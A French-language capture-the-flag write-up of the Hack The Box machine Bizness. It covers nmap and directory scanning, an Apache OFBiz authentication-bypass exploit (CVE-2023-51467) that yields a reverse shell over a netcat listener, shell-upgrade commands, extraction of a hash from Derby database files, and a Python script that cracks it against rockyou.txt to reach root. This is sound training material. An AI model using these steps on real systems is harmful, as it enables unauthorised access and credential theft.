---
date: 2024-05-22T21:18:09-05:00
# description: ""
image: "/images/HTB-Bizness/Bizness.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Bizness"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Bizness](https://app.hackthebox.com/machines/Bizness)
* Niveau: Facile
* OS: Linux
---

[Lire cet article en anglais](https://scorpiosec.com/posts/htb-bizness/)

Bizness présente une application web utilisant Apache OFBiz. En recherchant les vulnérabilités du logiciel, nous en identifions une qui permet aux attaquants de contourner l'authentification. En tirant parti de cette faille, nous parvenons à accéder au système. Ensuite, nous découvrons un dossier pour Apache Derby qui contient de nombreux fichiers .dat. Notre tâche consiste à les passer au crible. Une simple commande nous permet de trouver un hash de mot de passe. Malheureusement, les méthodes de craquage courantes ne parviennent pas à le forcer. Afin d'élever nos privilèges au niveau de root, nous changeons de tactique. Nous créons un script qui chiffre chaque ligne d'une liste de mots et comparons les hashs obtenus à celui que nous avons. Une fois la correspondance trouvée, le mot de passe de root est révélé.

Adresse IP cible - `10.10.11.252`

## Scanning

```
nmap -sC -sV -oA nmap/Bizness 10.10.11.252
```

**Résultats**

```shell
Nmap 7.94SVN scan initiated Mon Mar  4 14:20:48 2024 as: nmap -sC -sV -oA nmap/Bizness 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up (0.046s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Mon Mar  4 14:21:07 2024 -- 1 IP address (1 host up) scanned in 18.37 seconds
```

Notre scan révèle trois ports ouverts :
* Port 22/tcp : SSH (Secure Shell).
* Port 80/tcp : HTTP avec nginx 1.18.0.
* Port 443/tcp : SSL/HTTP (HTTPS) avec nginx 1.18.0.

Nous avons aussi une redirection vers `bizness.htb`, que nous ajoutons à notre fichier `/etc/hosts` avec `sudo echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts`.

## Enumération

À l'adresse `https://bizness.htb/`, nous trouvons le site web d'une entreprise proposant différents services.

![Bizness website](/images/HTB-Bizness/bizness-website.png)

En fin de page, on remarque que l'application web utilise `Apache OFBiz`.

![Footer info showing Apache OFBiz used](/images/HTB-Bizness/pwrd-Apache-OFBiz.png)

Le site web n'offre pas d'autres informations utiles et nous passons donc au "directory brute forcing".

![Dirsearch results](/images/HTB-Bizness/dirsearch1.png)

![More dirsearch results](/images/HTB-Bizness/dirsearch2.png)

`/control` mène à une page d'erreur.

![Apache OFBiz error message](/images/HTB-Bizness/apache-OFBiz.png)

> Apache OFBiz est un système de planification des ressources d'entreprise open source. Il fournit une gamme d'applications d'entreprise qui intègrent et automatisent de nombreux processus d'affaires d'une entreprise.

Nous allons ensuite à `/control/login` et trouvons une page de login.

![Apache OFBiz login page](/images/HTB-Bizness/apacheOFBiz-login.png)

## Accès initial

Nous n'avons pas d'informations d'identification à ce stade. En recherchant les vulnérabilités d'Apache OFBiz et nous trouvons le `CVE-20023-51467`.

![CVE-2023-51467](/images/HTB-Bizness/CVE-2023-51467.png)

Un exploit est disponible sur ce [compte Github](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master). Le script `xdetection` permet de vérifier que la cible est effectivement vulnérable.

![CVE-2023-51467 test](/images/HTB-Bizness/ApacheOFBiz-vulnerable.png)

Nous mettons en place un listener netcat et exécutons le script d'exploitation.

```
nc -lvnp 4444
```

![Apache OFBiz exploitation](/images/HTB-Bizness/exploit-script-ApacheOFBiz.png)

Nous obtenons une connexion sur notre listeneer netcat!

![Reverse shell](/images/HTB-Bizness/reverse-shell.png)

Les commandes ci-dessous sont utilisées pour améliorer notre shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
```
![Reverse shell](/images/HTB-Bizness/better-shell.png)

Le drapeau de l'utilisateur se trouve à `/home/ofbiz/user.txt`.

![User flag](/images/HTB-Bizness/user-flag.png)

## Elévation de Privilèges

Après avoir exploré le système, nous trouvons un hash de mot de passe dans `/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml` mais nous ne parvenons pas à le craquer.

En creusant un peu plus, nous trouvons un dossier appelé `derby`.

> Apache Derby est un système de gestion de base de données relationnelle développé par la Apache Software Foundation, qui peut être intégré dans des programmes Java et utilisé pour le traitement des transactions en ligne.

Un fichier appelé `README_DO_NOT_TOUCH_FILES.txt` dans `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` confirme qu'il s'agit bien du dossier de la base de données.

![Apache derby database file](/images/HTB-Bizness/derby-db.png)

Le répertoire `seg0` contient de nombreux fichiers `.dat`.

![.dat files list](/images/HTB-Bizness/dat-files.png)

Pour faciliter la recherche de contenu, nous les regroupons dans un seul fichier `.txt` que nous transférons sur notre machine locale.

```
cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* > dat_files.txt
```

Sur notre machine locale, nous recherchons dans tous les fichiers `.dat` avec 

```
strings dat_files.txt | grep SHA
```

Un hachage est trouvé.

![hash found](/images/HTB-Bizness/hash1.png)

```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

Dans le même fichier, nous trouvons une ligne avec `admin` comme nom d'utilisateur, ce qui suggère qu'il s'agit du hash du mot de passe de l'administrateur. Mais nous ne sommes pas en mesure de craquer le hash. Nous disposons maintenant de deux hashs mais aucun moyen de les craquer.

![admin username](/images/HTB-Bizness/login-admin.png)

Nous procédons autrement, en chiffrant chaque ligne de la liste de mots `rockyou.txt` et en les comparant au dernier hash trouvé. La correspondance révélera le mot de passe.

> Vous pouvez consulter le [code source](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java) d'Apache OFBiz pour voir comment les hashs sont générés. 

```python
import hashlib
import base64
import os

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Iterate through the wordlist and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in password_list:
        value = password.strip()
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        if hashed_password == search:
            print(f'Password found: {value}, hash: {hashed_password}')
            break
```

Après l'exécution du script, nous trouvons le mot de passe `monkeybizness`.

![Password finder with Python](/images/HTB-Bizness/pwd-find.png)

Nous l'utilisons pour nous connecter en tant que root avec `su root`.

![root login](/images/HTB-Bizness/root-login.png)

Et `root.txt` se trouve dans `/root`.

![root flag](/images/HTB-Bizness/root-flag.png)

Il est indéniable que la programmation fait de nous de meilleurs hackers, j'encourage tout le monde à apprendre les bases de Python, Bash et Powershell pour être capable d'écrire des scripts qui automatisent et facilitent certaines tâches. J'espère que cet article vous a été utile!

Recommandations:

* [Python for Hackers](https://www.youtube.com/watch?v=XWuP5Yf5ILI&t=1683s&ab_channel=RyanJohn)
* [Bash for Bug Bounty & Ethical Hacking](https://www.youtube.com/watch?v=YtKCoPvACVY&ab_channel=RyanJohn)
* [PowerShell for Hackers playlist](https://www.youtube.com/playlist?list=PL3NRVyAumvmppdfMFMUzMug9Cn_MtF6ub)
